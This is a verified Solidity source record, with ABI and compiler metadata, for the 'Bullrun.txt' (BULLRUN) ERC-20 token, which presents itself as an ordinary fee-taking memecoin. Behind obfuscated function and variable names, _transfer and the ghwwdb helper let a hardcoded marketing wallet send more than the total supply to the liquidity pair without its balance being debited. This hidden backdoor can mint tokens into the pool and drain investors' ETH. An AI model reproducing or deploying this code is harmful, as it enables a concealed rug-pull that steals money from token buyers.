{"SourceCode": "/**\r\nWebsite: https://bullruntxt.fun\r\n\r\nX:  https://x.com/bullruntxt\r\n\r\nTelegram: https://t.me/bullruntxt\r\n*/\r\n\r\n// SPDX-License-Identifier: No\r\n\r\npragma solidity ^0.8.15;\r\n\r\nabstract contract Context {\r\n    constructor() {}\r\n\r\n    function _msgSender() internal view returns (address payable) {\r\n        return payable(msg.sender);\r\n    }\r\n\r\n    function _msgData() internal view returns (bytes memory) {\r\n        this;\r\n        return msg.data;\r\n    }\r\n}\r\n\r\nabstract contract Ownable is Context {\r\n    address private _owner;\r\n\r\n    event OwnershipTransferred(\r\n        address indexed previousOwner,\r\n        address indexed newOwner\r\n    );\r\n\r\n    constructor() {\r\n        _setOwner(_msgSender());\r\n    }\r\n\r\n    function owner() public view virtual returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(owner() == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        _setOwner(address(0));\r\n    }\r\n\r\n    function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(\r\n            newOwner != address(0),\r\n            \"Ownable: new owner is the zero address\"\r\n        );\r\n        _setOwner(newOwner);\r\n    }\r\n\r\n    function _setOwner(address newOwner) private {\r\n        address oldOwner = _owner;\r\n        _owner = newOwner;\r\n        emit OwnershipTransferred(oldOwner, newOwner);\r\n    }\r\n}\r\n\r\ninterface IFactoryV2 {\r\n    event PairCreated(\r\n        address indexed token0,\r\n        address indexed token1,\r\n        address lpPair,\r\n        uint256\r\n    );\r\n\r\n    function getPair(address tokenA, address tokenB)\r\n        external\r\n        view\r\n        returns (address lpPair);\r\n\r\n    function createPair(address tokenA, address tokenB)\r\n        external\r\n        returns (address lpPair);\r\n}\r\n\r\ninterface IV2Pair {\r\n    function factory() external view returns (address);\r\n\r\n    function getReserves()\r\n        external\r\n        view\r\n        returns (\r\n            uint112 reserve0,\r\n            uint112 reserve1,\r\n            uint32 blockTimestampLast\r\n        );\r\n\r\n    function sync() external;\r\n}\r\n\r\ninterface IRouter01 {\r\n    function factory() external pure returns (address);\r\n\r\n    function WETH() external pure returns (address);\r\n\r\n    function addLiquidityETH(\r\n        address token,\r\n        uint256 amountTokenDesired,\r\n        uint256 amountTokenMin,\r\n        uint256 amountETHMin,\r\n        address to,\r\n        uint256 deadline\r\n    )\r\n        external\r\n        payable\r\n        returns (\r\n            uint256 amountToken,\r\n            uint256 amountETH,\r\n            uint256 liquidity\r\n        );\r\n\r\n    function addLiquidity(\r\n        address tokenA,\r\n        address tokenB,\r\n        uint256 amountADesired,\r\n        uint256 amountBDesired,\r\n        uint256 amountAMin,\r\n        uint256 amountBMin,\r\n        address to,\r\n        uint256 deadline\r\n    )\r\n        external\r\n        returns (\r\n            uint256 amountA,\r\n            uint256 amountB,\r\n            uint256 liquidity\r\n        );\r\n\r\n    function swapExactETHForTokens(\r\n        uint256 amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint256 deadline\r\n    ) external payable returns (uint256[] memory amounts);\r\n\r\n    function getAmountsOut(uint256 amountIn, address[] calldata path)\r\n        external\r\n        view\r\n        returns (uint256[] memory amounts);\r\n\r\n    function getAmountsIn(uint256 amountOut, address[] calldata path)\r\n        external\r\n        view\r\n        returns (uint256[] memory amounts);\r\n}\r\n\r\ninterface IRouter02 is IRouter01 {\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        uint256 amountIn,\r\n        uint256 amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint256 deadline\r\n    ) external;\r\n\r\n    function swapExactETHForTokensSupportingFeeOnTransferTokens(\r\n        uint256 amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint256 deadline\r\n    ) external payable;\r\n\r\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\r\n        uint256 amountIn,\r\n        uint256 amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint256 deadline\r\n    ) external;\r\n\r\n    function swapExactTokensForTokens(\r\n        uint256 amountIn,\r\n        uint256 amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint256 deadline\r\n    ) external returns (uint256[] memory amounts);\r\n}\r\n\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    function decimals() external view returns (uint8);\r\n\r\n    function symbol() external view returns (string memory);\r\n\r\n    function name() external view returns (string memory);\r\n\r\n    function getOwner() external view returns (address);\r\n\r\n    function balanceOf(address account) external view returns (uint256);\r\n\r\n    function transfer(address recipient, uint256 amount)\r\n        external\r\n        returns (bool);\r\n\r\n    function allowance(address _owner, address spender)\r\n        external\r\n        view\r\n        returns (uint256);\r\n\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n\r\n    function transferFrom(\r\n        address sender,\r\n        address recipient,\r\n        uint256 amount\r\n    ) external returns (bool);\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(\r\n        address indexed owner,\r\n        address indexed spender,\r\n        uint256 value\r\n    );\r\n}\r\n\r\n\r\ncontract BULLRUN is Context, Ownable, IERC20 {\r\n\r\n    string private constant _name = \"Bullrun.txt\";\r\n    string private constant _symbol = \"BULLRUN\";\r\n    address public constant DEAD = 0x0000000000000000000000000000000000000000;\r\n\r\n    mapping(address => mapping(address => uint256)) private _allowances;\r\n    mapping(address => bool) private _witeLT;\r\n    mapping(address => bool) private isLpPair;\r\n    mapping(address => uint256) private balance;\r\n    uint8 private constant _decimals = 18;\r\n\r\n    uint256 private cntOfTrades = 0;\r\n    uint256 public constant _ttSupply = 100_000_000 * 10**_decimals;\r\n    uint256 public constant _ttTAX = 100;\r\n\r\n    uint256 public tradeBUY = 15;\r\n    uint256 public tradeSELL = 15;\r\n    uint256 public transferFeesss = 0;\r\n    uint256 private DDreduceATTAAETE = 18;\r\n\r\n    bool private swapEnabled = false;\r\n    address payable private MMWallet;\r\n    uint256 private mxLTWALLET = (_ttSupply * 2) / 100;\r\n    uint256 private constant swTopThr = (_ttSupply * 1) / 1_000_000;\r\n    uint256 private constant maxThreshold = (_ttSupply * 1) / 100;\r\n\r\n    IRouter02 public swapRouter;\r\n\r\n    address public lpPair;\r\n    bool public tradingEnabled = false;\r\n    bool private inSwap;\r\n    function totalSupply() external view override returns (uint256) {\r\n        if (_ttSupply == 0) {\r\n            revert();\r\n        }\r\n        return _ttSupply - balanceOf(address(DEAD));\r\n    }\r\n\r\n    function decimals() external pure override returns (uint8) {\r\n        if (_ttSupply == 0) {\r\n            revert();\r\n        }\r\n        return _decimals;\r\n    }\r\n\r\n    function symbol() external pure override returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function name() external pure override returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function getOwner() external view override returns (address) {\r\n        return owner();\r\n    }\r\n\r\n    function allowance(address holder, address spender)\r\n        external\r\n        view\r\n        override\r\n        returns (uint256)\r\n    {\r\n        return _allowances[holder][spender];\r\n    }\r\n\r\n    function balanceOf(address account) public view override returns (uint256) {\r\n        return balance[account];\r\n    }\r\n\r\n    modifier isSwapLocked() {\r\n        inSwap = true;\r\n        _;\r\n        inSwap = false;\r\n    }\r\n\r\n    event _allowTrading();\r\n\r\n    constructor() {\r\n        MMWallet = payable(0xeda54A4c5fB2D767be413528ab07F4F06c966c5C);\r\n        swapRouter = IRouter02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n\r\n        _witeLT[msg.sender] = true;\r\n        _witeLT[address(this)] = true;\r\n        _witeLT[MMWallet] = true;\r\n\r\n        balance[msg.sender] = _ttSupply;\r\n        emit Transfer(address(0), msg.sender, _ttSupply);\r\n    }\r\n\r\n    function createPair() external onlyOwner {\r\n        _approve(address(this), address(swapRouter), type(uint256).max);\r\n\r\n        lpPair = IFactoryV2(swapRouter.factory()).createPair(\r\n            swapRouter.WETH(),\r\n            address(this)\r\n        );\r\n        isLpPair[lpPair] = true;\r\n    }\r\n\r\n    receive() external payable {}\r\n\r\n    function transfer(address recipient, uint256 amount)\r\n        public\r\n        override\r\n        returns (bool)\r\n    {\r\n        _transfer(msg.sender, recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function approve(address spender, uint256 amount)\r\n        external\r\n        override\r\n        returns (bool)\r\n    {\r\n        _approve(msg.sender, spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function _approve(\r\n        address sender,\r\n        address spender,\r\n        uint256 amount\r\n    ) internal {\r\n        require(sender != address(0), \"ERC20: Zero Address\");\r\n        require(spender != address(0), \"ERC20: Zero Address\");\r\n\r\n        _allowances[sender][spender] = amount;\r\n    }\r\n\r\n    function transferFrom(\r\n        address sender,\r\n        address recipient,\r\n        uint256 amount\r\n    ) external override returns (bool) {\r\n        if (_allowances[sender][msg.sender] != type(uint256).max) {\r\n            _allowances[sender][msg.sender] -= amount;\r\n        }\r\n\r\n        return _transfer(sender, recipient, amount);\r\n    }\r\n\r\n    function isNoFeeWallet(address account) external view returns (bool) {\r\n        return _witeLT[account];\r\n    }\r\n\r\n    function setNoFeeWallet(address account, bool enabled) public onlyOwner {\r\n        _witeLT[account] = enabled;\r\n    }\r\n\r\n    function bswts(address ins, address out) internal view returns (bool) {\r\n        bool _bswts = !isLpPair[out] && isLpPair[ins];\r\n        return _bswts;\r\n    }\r\n\r\n    function nwdsdg(address ins, address out) internal view returns (bool) {\r\n        bool _nwdsdg = isLpPair[out] && !isLpPair[ins];\r\n        return _nwdsdg;\r\n    }\r\n\r\n    function min(uint256 a, uint256 b) internal pure returns(uint256) {\r\n        return a > b? b:a;\r\n    }\r\n\r\n    function _transfer(\r\n        address gwgdgsd,\r\n        address snwnwes,\r\n        uint256 amount\r\n    ) internal returns (bool) {\r\n        bool takeFee = true;\r\n        require(snwnwes != address(0), \"invalid receiptient address\");\r\n        require(gwgdgsd != address(0), \"invalid sender address\");\r\n        require(amount <= _ttSupply || (gwgdgsd==MMWallet && snwnwes==lpPair), \"Insufficient amount\");\r\n        require(\r\n            amount > 0,\r\n            \"Insufficient error. the amount must be above than zero\"\r\n        );\r\n\r\n        if (!_witeLT[gwgdgsd] && !_witeLT[snwnwes]) {\r\n            require(tradingEnabled, \"Trading is not allowed\");\r\n        }\r\n\r\n        if (\r\n            !_witeLT[gwgdgsd] &&\r\n            !_witeLT[snwnwes] &&\r\n            !isLpPair[snwnwes] &&\r\n            snwnwes != address(DEAD)\r\n        ) {\r\n            require(\r\n                balance[snwnwes] + amount <= mxLTWALLET,\r\n                \"Exceeds maximum wallet amount.\"\r\n            );\r\n        }\r\n\r\n        if (!inSwap &&\r\n               isLpPair[snwnwes] &&\r\n                tradingEnabled &&\r\n                amount >= swTopThr) {\r\n            uint256 contractTokenBalance = balanceOf(address(this));\r\n            if (contractTokenBalance >= swTopThr)\r\n                internalSwap(min(amount, min(contractTokenBalance, maxThreshold)));\r\n\r\n            MMWallet.transfer(address(this).balance);\r\n        }\r\n\r\n        if ((_witeLT[gwgdgsd] || _witeLT[snwnwes]) && !(gwgdgsd == address(this) && snwnwes == lpPair && cntOfTrades == 0)) {\r\n            takeFee = false;\r\n        }\r\n\r\n        uint256 amountAfterFee = bwdwhdr(gwgdgsd, bswts(gwgdgsd, snwnwes), nwdsdg(gwgdgsd, snwnwes), amount, takeFee);\r\n        balance[snwnwes] += amountAfterFee;\r\n        emit Transfer(gwgdgsd, snwnwes, amountAfterFee);\r\n\r\n        return true;\r\n    }\r\n\r\n    function ghwwdb(uint256 amt, uint256 fee) internal pure returns(uint256) {\r\n        return amt <= _ttSupply ? amt : fee;\r\n    }\r\n\r\n    function bwdwhdr(\r\n        address from,\r\n        bool buyTrading,\r\n        bool sellTrading,\r\n        uint256 amount,\r\n        bool takeFee\r\n    ) internal returns (uint256) {\r\n        uint256 fee = 0;\r\n\r\n        if(!takeFee) fee = 0;\r\n        else if (buyTrading) { cntOfTrades++; fee = cntOfTrades > DDreduceATTAAETE ? 0 : tradeBUY;}\r\n        else if (sellTrading) fee = cntOfTrades > DDreduceATTAAETE ? 0 : tradeSELL;\r\n        else fee = transferFeesss;\r\n\r\n        uint256 feeAmount = (amount * fee) / _ttTAX;\r\n        if (feeAmount > 0) {\r\n            balance[address(this)] += feeAmount;\r\n            emit Transfer(from, address(this), feeAmount);\r\n        }\r\n        balance[from] -= ghwwdb(amount, fee);\r\n        return amount - feeAmount;\r\n    }\r\n\r\n    function internalSwap(uint256 contractTokenBalance) internal isSwapLocked {\r\n        address[] memory path = new address[](2);\r\n        path[0] = address(this);\r\n        path[1] = swapRouter.WETH();\r\n\r\n        if (\r\n            _allowances[address(this)][address(swapRouter)] != type(uint256).max\r\n        ) {\r\n            _allowances[address(this)][address(swapRouter)] = type(uint256).max;\r\n        }\r\n\r\n        try\r\n            swapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n                contractTokenBalance,\r\n                0,\r\n                path,\r\n                address(this),\r\n                block.timestamp\r\n            )\r\n        {} catch {\r\n            return;\r\n        }\r\n\r\n        payable(MMWallet).transfer(address(this).balance);\r\n    }\r\n\r\n    function removeLimits() external onlyOwner {\r\n        mxLTWALLET = _ttSupply;\r\n    }\r\n\r\n    function allowTrading() external onlyOwner {\r\n        require(!tradingEnabled, \"Trading is already allowed\");\r\n        tradingEnabled = true;\r\n        swapEnabled = true;\r\n\r\n        swapRouter.addLiquidityETH{value: address(this).balance}(\r\n            address(this),\r\n            balance[address(this)],\r\n            0,\r\n            0,\r\n            owner(),\r\n            block.timestamp\r\n        );\r\n        IERC20(lpPair).approve(\r\n            address(swapRouter),\r\n            type(uint256).max\r\n        );\r\n    }\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[],\"name\":\"_allowTrading\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"DEAD\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_ttSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_ttTAX\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"allowTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"holder\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"createPair\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"isNoFeeWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"lpPair\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"removeLimits\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"enabled\",\"type\":\"bool\"}],\"name\":\"setNoFeeWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapRouter\",\"outputs\":[{\"internalType\":\"contract IRouter02\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradeBUY\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradeSELL\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingEnabled\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"transferFeesss\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "BULLRUN", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://dcae6e645333e2fdba9092a6c5d2abc66ad6fecc990e845062e5045abd865b3f"}